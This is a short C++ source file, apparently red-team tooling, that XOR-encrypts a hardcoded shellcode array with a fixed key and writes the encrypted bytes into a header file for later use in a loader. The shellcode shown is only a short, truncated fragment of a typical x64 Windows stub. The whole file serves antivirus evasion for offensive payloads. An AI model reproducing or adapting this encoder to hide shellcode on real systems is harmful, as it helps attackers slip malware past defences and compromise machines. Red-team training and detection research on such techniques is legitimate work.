#include <iostream>
#include <fstream>
#include <vector>
#include <string>

// XOR encryption key
const std::string key = "redteamexercises";

// Hardcoded shellcode 
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52";

const size_t shellcode_size = sizeof(shellcode);

// XOR encryption function
void xor_encrypt(std::vector<unsigned char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.size()];
    }
}

int main() {
    std::vector<unsigned char> encrypted_shellcode(shellcode, shellcode + shellcode_size);

    xor_encrypt(encrypted_shellcode, key);

    std::ofstream outputFile("encrypted_shellcode.h");
    if (!outputFile) {
        std::cerr << "Error creating output file.\n";
        return 1;
    }

    outputFile << "#pragma once\n";
    outputFile << "unsigned char encrypted_shellcode[] = {";
    for (size_t i = 0; i < encrypted_shellcode.size(); i++) {
        outputFile << "0x" << std::hex << (int)encrypted_shellcode[i];
        if (i != encrypted_shellcode.size() - 1) outputFile << ", ";
    }
    outputFile << "};\n";
    outputFile << "const size_t shellcode_size = " << encrypted_shellcode.size() << ";\n";

    outputFile.close();
    std::cout << "[+] Encrypted shellcode saved in 'encrypted_shellcode.h'\n";
    return 0;
}
